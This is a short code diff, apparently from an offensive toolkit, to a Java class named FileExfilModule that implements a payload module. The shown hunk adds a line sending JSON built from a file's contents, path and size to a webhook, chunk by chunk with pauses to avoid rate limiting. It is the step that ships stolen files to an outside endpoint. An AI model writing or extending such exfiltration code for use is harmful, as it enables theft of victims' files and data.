@@ -108,6 +108,8 @@ public class FileExfilModule implements PayloadModule {
                                 .replace("\n", "\\n").replace("\r", ""),
                         filePath, fileSize);
 
+                notifier.sendWebhook(json);
+
                 // Small delay between chunks to avoid rate limiting
                 if (i > 0) Thread.sleep(1000);
             }
